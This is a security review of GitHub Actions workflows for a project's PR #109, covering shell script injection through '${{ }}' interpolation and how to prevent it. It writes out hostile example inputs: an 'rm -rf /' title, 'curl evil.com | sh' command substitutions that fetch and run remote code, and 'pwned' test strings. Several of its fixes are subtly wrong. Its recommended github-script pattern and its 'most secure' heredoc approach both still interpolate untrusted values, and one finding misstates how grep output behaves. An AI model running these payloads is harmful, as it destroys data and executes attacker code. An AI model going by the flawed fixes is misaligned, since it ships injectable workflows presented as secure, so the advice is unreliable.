# GitHub Actions Security Analysis: Variable Handling and Script Injection Prevention

## Executive Summary

This document analyzes the security implications of different variable handling approaches in GitHub Actions workflows, specifically addressing shell script injection vulnerabilities and best practices for preventing them.

## The Core Security Problem

### Shell Script Injection Attack Vector

Shell script injection occurs when untrusted input is directly interpolated into shell commands, allowing attackers to execute arbitrary commands. In GitHub Actions, this can happen when:

1. User-controlled input (PR titles, branch names, commit messages) is directly embedded in shell scripts
2. Workflow inputs are improperly sanitized before use
3. GitHub context variables are unsafely expanded in shell commands

### Example of Vulnerable Code

```yaml
# VULNERABLE - Direct interpolation
- run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # If title contains: "; rm -rf / #
    # Results in: echo "PR title: "; rm -rf / #"
```

## Security Approaches Comparison

### Approach 1: Using printf (Current Implementation)

```yaml
- name: Summary
  run: |
    printf -- "- **New Version:** \`%s\`\n" "${{ steps.bump.outputs.version }}"
```

**Security Analysis:**
- ❌ **NOT SECURE**: The `${{ }}` syntax is still expanded BEFORE the shell sees it
- ❌ Printf doesn't prevent injection if the value is interpolated before the command runs
- ❌ The `--` flag only prevents printf option injection, not shell injection

**Attack Example:**
```yaml
# If version contains: $(curl evil.com/steal-secrets.sh | sh)
# GitHub Actions expands to:
printf -- "- **New Version:** \`%s\`\n" "$(curl evil.com/steal-secrets.sh | sh)"
# Shell executes the command substitution BEFORE printf runs
```

### Approach 2: Environment Variables (Recommended)

```yaml
- name: Summary
  env:
    VERSION: ${{ steps.bump.outputs.version }}
  run: |
    printf -- "- **New Version:** \`%s\`\n" "$VERSION"
```

**Security Analysis:**
- ✅ **SECURE**: Variable is set in environment, not interpolated into script
- ✅ Shell sees `"$VERSION"` as a variable reference, not raw input
- ✅ No command substitution or injection possible

**Why This Works:**
1. GitHub Actions sets the environment variable BEFORE executing the shell
2. The shell script contains only the variable name, not the value
3. Shell variable expansion is safe from injection

### Approach 3: Intermediate File (Most Secure)

```yaml
- name: Summary
  run: |
    # Write to file first
    cat > version.txt << 'EOF'
    ${{ steps.bump.outputs.version }}
    EOF

    # Read from file
    VERSION=$(cat version.txt)
    printf -- "- **New Version:** \`%s\`\n" "$VERSION"
```

**Security Analysis:**
- ✅ **MOST SECURE**: Complete isolation of untrusted data
- ✅ No shell interpretation of the content
- ✅ Here-doc with quoted delimiter prevents expansion
- ⚠️ More complex to implement

## Best Practices for GitHub Actions Security

### 1. Always Use Environment Variables for Dynamic Values

```yaml
# GOOD - Secure pattern
- name: Process user input
  env:
    USER_INPUT: ${{ github.event.inputs.custom_version }}
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    # Safe to use environment variables
    echo "Processing: $USER_INPUT"
    echo "PR: $PR_TITLE"
```

### 2. Never Interpolate GitHub Context Directly in Scripts

```yaml
# BAD - Vulnerable to injection
- run: echo "${{ github.event.pull_request.title }}"

# GOOD - Using environment variable
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

### 3. Use actions/github-script for Complex GitHub Operations

```yaml
# GOOD - JavaScript context is safer
- uses: actions/github-script@v7
  with:
    script: |
      const version = '${{ steps.bump.outputs.version }}';
      // JavaScript string literals are safer than shell
      await github.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.issue.number,
        body: `Version bumped to ${version}`
      });
```

### 4. Validate and Sanitize All Inputs

```yaml
- name: Validate version format
  env:
    VERSION: ${{ inputs.custom_version }}
  run: |
    # Validate before use
    if ! echo "$VERSION" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+(-[a-z]+(\.[0-9]+)?)?$'; then
      echo "Invalid version format"
      exit 1
    fi

    # Now safe to use
    echo "Valid version: $VERSION"
```

### 5. Use Least Privilege Permissions

```yaml
permissions:
  contents: read  # Not write unless necessary
  pull-requests: write
  # Never use write-all or admin permissions
```

## Specific Vulnerabilities in Current PR #109

### Finding 1: Unsafe Summary Generation

**Current Code:**
```yaml
printf -- "- **New Version:** \`%s\`\n" "${{ steps.bump.outputs.version }}"
```

**Issue:** Direct interpolation happens before printf runs

**Fix:**
```yaml
env:
  VERSION: ${{ steps.bump.outputs.version }}
  BUMP_TYPE: ${{ inputs.bump_type }}
  CUSTOM_VERSION: ${{ inputs.custom_version || 'N/A' }}
run: |
  {
    printf "# 📦 Release PR Created\n\n"
    printf "## Version Information\n"
    printf -- "- **New Version:** \`%s\`\n" "$VERSION"
    printf -- "- **Bump Type:** %s\n" "$BUMP_TYPE"
    printf -- "- **Custom Version:** %s\n" "$CUSTOM_VERSION"
  } >> $GITHUB_STEP_SUMMARY
```

### Finding 2: Script Output Parsing

**Current Code:**
```bash
VERSION=$(echo "$OUTPUT" | grep "^version=" | cut -d= -f2)
```

**Issue:** If OUTPUT contains malicious content, it could be executed

**Fix:**
```bash
# Use temporary file instead
scripts/version-bump.sh "$BUMP_TYPE" "$CUSTOM_VERSION" > output.txt
VERSION=$(grep "^version=" output.txt | cut -d= -f2)
```

### Finding 3: PR Body Generation

**Current Implementation in create-release-pr.sh:**
```bash
cat > "$PR_BODY_FILE" << 'ENDOFBODY'
...
ENDOFBODY
envsubst < "$PR_BODY_FILE" > "${PR_BODY_FILE}.tmp"
```

**Analysis:**
- ✅ This is actually SECURE because:
  1. Variables are exported to environment first
  2. envsubst only substitutes from environment variables
  3. No shell interpretation happens

## Recommendations for PR #109

### High Priority (Security Critical)

1. **Fix the Summary Section**: Move all `${{ }}` expressions to environment variables
2. **Add Input Validation**: Validate version format before processing
3. **Use Temporary Files**: For script output parsing instead of command substitution

### Medium Priority (Best Practices)

1. **Orthogonal Prerelease Types**: Separate bump type from prerelease modifiers
2. **Add Security Comments**: Document why certain patterns are used
3. **Create Reusable Action**: Encapsulate version bump logic

### Low Priority (Nice to Have)

1. **Add SARIF Output**: For security scanning results
2. **Implement Signing**: Sign commits and tags
3. **Add Audit Logging**: Track all release actions

## Testing Security Improvements

### Test Cases for Injection Prevention

```bash
# Test 1: Command substitution attempt
MALICIOUS_VERSION='1.0.0$(echo pwned > /tmp/pwned.txt)'

# Test 2: Command chaining attempt
MALICIOUS_VERSION='1.0.0"; curl evil.com | sh; echo "'

# Test 3: Variable expansion attempt
MALICIOUS_VERSION='1.0.0${PATH}'

# Test 4: Glob expansion attempt
MALICIOUS_VERSION='1.0.0*'
```

### Validation Script

```bash
#!/bin/bash
validate_version() {
    local version=$1

    # Strict regex validation
    if [[ ! "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[a-z]+(\.[0-9]+)?)?$ ]]; then
        echo "ERROR: Invalid version format: $version" >&2
        return 1
    fi

    # Additional security checks
    if [[ "$version" == *"$"* ]] || [[ "$version" == *"\`"* ]] || [[ "$version" == *";"* ]]; then
        echo "ERROR: Suspicious characters in version: $version" >&2
        return 1
    fi

    return 0
}
```

## Conclusion

The current implementation in PR #109 has security vulnerabilities that should be addressed:

1. **Primary Issue**: Direct interpolation of GitHub context variables in shell scripts
2. **Solution**: Use environment variables for ALL dynamic values
3. **printf vs echo**: Neither prevents injection if variables are interpolated before the command runs

The statement "Use printf to safely handle variables" is misleading. Printf doesn't provide security against injection - **environment variables do**.

## References

- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [GitHub Actions: Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
